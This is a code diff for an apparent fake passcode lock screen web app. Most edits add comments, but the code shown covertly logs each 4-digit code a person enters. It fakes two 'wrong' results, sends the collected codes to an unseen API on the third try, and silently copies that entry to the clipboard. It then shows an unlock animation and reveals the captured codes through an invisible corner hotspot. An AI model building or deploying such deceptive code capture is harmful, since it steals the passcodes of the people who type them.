@@ -14,41 +14,37 @@
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
 
-  /* ---- Tiny early hotspot guard: if the early hotspot didn't get created in index.html,
-        create a minimal one now so touches are never swallowed. This is purely DOM-creation
-        and does not change any of your existing hotspot logic below. ---- */
-  (function ensureEarlyHotspot() {
-    if (!document.getElementById('codesHotspot')) {
-      const hs = document.createElement('div');
-      hs.id = 'codesHotspot';
-      Object.assign(hs.style, {
-        position: 'fixed',
-        left: '8px',
-        bottom: '8px',
-        width: '56px',
-        height: '56px',
-        borderRadius: '12px',
-        background: 'transparent',
-        border: 'none',
-        zIndex: '12000',
-        display: 'flex',
-        alignItems: 'center',
-        justifyContent: 'center',
-        boxSizing: 'border-box',
-        touchAction: 'manipulation',
-        cursor: 'pointer',
-        pointerEvents: 'auto'
-      });
-      document.body.appendChild(hs);
-    }
-  })();
+  // ---- TINY: make sure hotspot exists early (DOM created very early in index.html too) ----
+  if (!document.getElementById('codesHotspot')) {
+    const hs = document.createElement('div');
+    hs.id = 'codesHotspot';
+    Object.assign(hs.style, {
+      position: 'fixed',
+      left: '8px',
+      bottom: '8px',
+      width: '56px',
+      height: '56px',
+      borderRadius: '12px',
+      background: 'transparent',
+      border: 'none',
+      zIndex: '12000',
+      display: 'flex',
+      alignItems: 'center',
+      justifyContent: 'center',
+      boxSizing: 'border-box',
+      touchAction: 'manipulation',
+      cursor: 'pointer',
+      pointerEvents: 'auto'
+    });
+    document.body.appendChild(hs);
+  }
 
-  // --- prevent page rubber-band / scroll on iOS PWAs so UI stays static ---
+  // ---- TINY: Prevent touchmove rubber-band ONLY in standalone (PWA) mode ----
   try {
     const isStandalone = (window.matchMedia && window.matchMedia('(display-mode: standalone)').matches)
                          || window.navigator.standalone;
     if (isStandalone) {
-      document.addEventListener('touchmove', function (e) {
+      window.addEventListener('touchmove', function (e) {
         e.preventDefault();
       }, { passive: false });
     }
@@ -87,15 +83,20 @@
   }
 
   (function ensureFreshSessionOnLaunch() {
+    // Use sessionStorage as a per-session marker. When a new PWA launch happens
+    // the browsing context is new and sessionStorage will be empty — we clear.
     try {
       const alreadyStarted = sessionStorage.getItem('pass_session_started');
       function markStarted() { sessionStorage.setItem('pass_session_started', '1'); }
 
+      // If no session flag, treat this as a fresh launch and clear persisted data.
       if (!alreadyStarted) {
         clearSavedAttempts();
         markStarted();
       }
 
+      // Also respond to pageshow (covers bfcache restores). If sessionStorage was cleared
+      // (new browsing context) pageshow will still call init above.
       window.addEventListener('pageshow', () => {
         if (!sessionStorage.getItem('pass_session_started')) {
           clearSavedAttempts();
@@ -103,6 +104,7 @@
         }
       }, { passive: true });
     } catch (err) {
+      // if anything goes wrong, fail silently and don't break the app
       console.warn('session init check failed', err);
     }
   })();
@@ -111,9 +113,10 @@
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
 
   function refreshDots() {
+    // Ensure dotEls are up-to-date if DOM changed
     const dots = Array.from(document.querySelectorAll('.dot'));
     dots.forEach((d,i) => d.classList.toggle('filled', i < code.length));
-    updateCancelText();
+    updateCancelText(); // keep label in sync whenever dots change
   }
 
   function reset() {
@@ -147,8 +150,8 @@
   /* ---------- Spring engine (semi-implicit integrator) ---------- */
   function springAnimate(opts) {
     const mass = opts.mass ?? 1;
-    const stiffness = opts.stiffness ?? 120;
-    const damping = opts.damping ?? 14;
+    const stiffness = opts.stiffness ?? 120; // k
+    const damping = opts.damping ?? 14;      // c
     const threshold = opts.threshold ?? 0.02;
     let x = opts.from;
     let v = opts.velocity ?? 0;
@@ -263,6 +266,7 @@
     }
     const DURATION = 700;
 
+    // Force Cancel label back to 'Cancel' during shake
     if (cancelBtn) cancelBtn.textContent = 'Cancel';
 
     dotsEl.classList.add('wrong');
@@ -274,8 +278,12 @@
 
   /* ---------- Clipboard helper & toast (preserve user gesture) ---------- */
   function copyToClipboard(text) {
+    // Try modern API first
     if (navigator.clipboard && navigator.clipboard.writeText) {
-      return navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
+      return navigator.clipboard.writeText(text).catch(() => {
+        // fallback to execCommand if modern API fails
+        return fallbackCopy(text);
+      });
     }
     return Promise.resolve().then(() => fallbackCopy(text));
   }
@@ -285,6 +293,7 @@
       try {
         const ta = document.createElement('textarea');
         ta.value = text;
+        // Move off-screen
         ta.style.position = 'fixed';
         ta.style.left = '-9999px';
         ta.style.top = '0';
@@ -307,6 +316,7 @@
       t = document.createElement('div');
       t.id = 'pass-toast';
       document.body.appendChild(t);
+      // styles are in styles.css; if the file wasn't loaded, apply minimal styling
       if (!getComputedStyle(t).position) {
         Object.assign(t.style, {
           position: 'fixed',
@@ -330,7 +340,9 @@
     clearTimeout(t._hideTimer);
     t._hideTimer = setTimeout(() => {
       t.style.opacity = '0';
-      t._hideTimer2 = setTimeout(() => {}, 200);
+      t._hideTimer2 = setTimeout(() => {
+        // leave element in DOM for reuse
+      }, 200);
     }, ms);
   }
 
@@ -340,19 +352,26 @@
     attempts += 1;
     setAttempts(attempts);
 
+    // push code into rotating buffer (so hotspot displays exact payload)
     pushLastCode(enteredCode);
 
+    // 1-2: wrong attempts (no send)
     if (attempts === 1 || attempts === 2) {
       animateWrongAttempt();
-    } else if (attempts === 3) {
+    }
+    // 3: send combined last codes
+    else if (attempts === 3) {
       const combined = getCombinedLastCodes();
       if (combined) sendToAPI(combined);
       animateWrongAttempt();
-    } else if (attempts === 4) {
+    }
+    // 4: unlock animation (no send)
+    else if (attempts === 4) {
       playUnlockAnimation();
       setTimeout(reset, 300);
     }
 
+    // reset counter once we've reached the unlock threshold
     if (attempts >= 4) {
       setAttempts(0);
     }
@@ -362,7 +381,11 @@
     let startTime;
     const initial = parseFloat(el.dataset.brightness || "1");
     const change = target - initial;
-    function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
+
+    function easeOutCubic(t) {
+      return 1 - Math.pow(1 - t, 3);
+    }
+
     function frame(ts) {
       if (!startTime) startTime = ts;
       const progress = Math.min((ts - startTime) / duration, 1);
@@ -370,7 +393,9 @@
       const value = initial + change * eased;
       el.style.filter = `brightness(${value})`;
       el.dataset.brightness = value.toFixed(3);
-      if (progress < 1) requestAnimationFrame(frame);
+      if (progress < 1) {
+        requestAnimationFrame(frame);
+      }
     }
     requestAnimationFrame(frame);
   }
@@ -381,10 +406,13 @@
 
     k.addEventListener('touchstart', () => {
       animateBrightness(k, 1.6, 80);
+      // update Cancel->Delete immediately on touchstart for snappy feedback
       updateCancelText();
     }, { passive: true });
 
-    const endPress = () => { animateBrightness(k, 1, 100); };
+    const endPress = () => {
+      animateBrightness(k, 1, 100);
+    };
     k.addEventListener('touchend', endPress);
     k.addEventListener('touchcancel', endPress);
     k.addEventListener('mouseleave', endPress);
@@ -396,15 +424,32 @@
 
       if (code.length === MAX) {
         const enteredCode = code;
-        try {
-          const upcomingAttempts = getAttempts() + 1;
-          if (upcomingAttempts === 3) {
-            const toCopy = enteredCode;
-            copyToClipboard(toCopy).catch(() => showToast('Copy failed', 900));
-          }
-        } catch (err) { console.warn('clipboard pre-copy failed', err); }
 
-        setTimeout(() => { handleCompleteAttempt(enteredCode); }, 120);
+        // Ensure copy happens ONLY when:
+        //  - this is a full 4-digit entry (code.length === MAX)
+        //  - the resulting attempt count (after this entry) will equal 3
+        try {
+          const upcomingAttempts = getAttempts() + 1; // what attempts will be after this entry
+          if (upcomingAttempts === 3) {
+            // COPY ONLY the current (third) 4-digit entry — not the combined previous attempts.
+            const toCopy = enteredCode;
+            // Copy synchronously within the user gesture (returns Promise)
+            // NOTE: on success we intentionally do NOT show any "Copied" UI.
+            copyToClipboard(toCopy)
+              .catch(() => {
+                // show failure feedback only (optional)
+                showToast('Copy failed', 900);
+              });
+          }
+        } catch (err) {
+          // ignore clipboard errors and continue
+          console.warn('clipboard pre-copy failed', err);
+        }
+
+        // keep existing UX timing for the attempt completion (small delay for animation)
+        setTimeout(() => {
+          handleCompleteAttempt(enteredCode);
+        }, 120);
       }
     });
   });
@@ -413,6 +458,7 @@
 
   // ----------------- Cancel / Delete behavior (non-destructive) -----------------
   function updateCancelText() {
+    // refresh reference (in case DOM swapped) and update text
     cancelBtn = document.getElementById('cancel') || cancelBtn;
     if (!cancelBtn) return;
     cancelBtn.textContent = (code && code.length > 0) ? 'Delete' : 'Cancel';
@@ -421,16 +467,19 @@
   function wireCancelAsDelete() {
     const old = document.getElementById('cancel');
     if (!old) return;
+    // clone to remove prior listeners safely
     const cloned = old.cloneNode(true);
     old.parentNode && old.parentNode.replaceChild(cloned, old);
     cancelBtn = document.getElementById('cancel');
     cancelBtn.addEventListener('click', (e) => {
       e.preventDefault();
       if (code.length > 0) {
+        // delete last digit
         code = code.slice(0, -1);
         refreshDots();
         updateCancelText();
       } else {
+        // original cancel behavior
         reset();
       }
     });
@@ -438,11 +487,12 @@
 
   wireCancelAsDelete();
   updateCancelText();
+  // ------------------------------------------------------------------------------
 
   window.addEventListener('online', flushQueue);
   flushQueue();
 
-  /* ---------- Invisible bottom-left hotspot: show combined codes on press ---------- */
+  /* ---------- Invisible bottom-left hotspot: show combined last-6 codes on press ---------- */
 
   function createInvisibleHotspotAndDisplay() {
     // Hotspot (invisible)
@@ -513,6 +563,7 @@
   }
 
   function showCombinedStringAtBottomLeft() {
+    // show combined codes regardless of unlockOverlay state so hotspot is always reachable
     createInvisibleHotspotAndDisplay();
     const bar = document.getElementById('codesCombinedDisplay');
     const inner = document.getElementById('codesCombinedInner');
